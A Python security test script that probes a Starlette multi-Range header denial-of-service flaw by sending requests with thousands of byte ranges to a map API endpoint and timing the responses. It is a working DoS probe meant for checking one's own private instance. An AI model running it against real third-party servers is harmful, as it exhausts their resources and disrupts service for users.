"""Probe CVE-2025-62727 (Starlette < 0.49.1 FileResponse multi-Range quadratic merge) on /api/map/*.

Run ONLY against a private API instance (it burns CPU):
  uv run python tests/security/range_dos.py http://127.0.0.1:8012 [ranges ...]
"""

from __future__ import annotations

import sys
import time

import httpx


def main() -> int:
    base = sys.argv[1].rstrip("/")
    counts = [int(x) for x in sys.argv[2:]] or [10, 500, 2000, 5000]
    for n in counts:
        rng = "bytes=" + ",".join(f"{i}-{i + 1}" for i in range(0, n * 3, 3))  # disjoint ranges
        t = time.time()
        try:
            r = httpx.get(f"{base}/api/map/buildings", headers={"Range": rng}, timeout=180)
            print(
                f"ranges={n} header_bytes={len(rng)} status={r.status_code} body={len(r.content)} seconds={time.time() - t:.2f}",
                flush=True,
            )
        except Exception as e:  # noqa: BLE001
            print(f"ranges={n} error={type(e).__name__} seconds={time.time() - t:.2f}", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
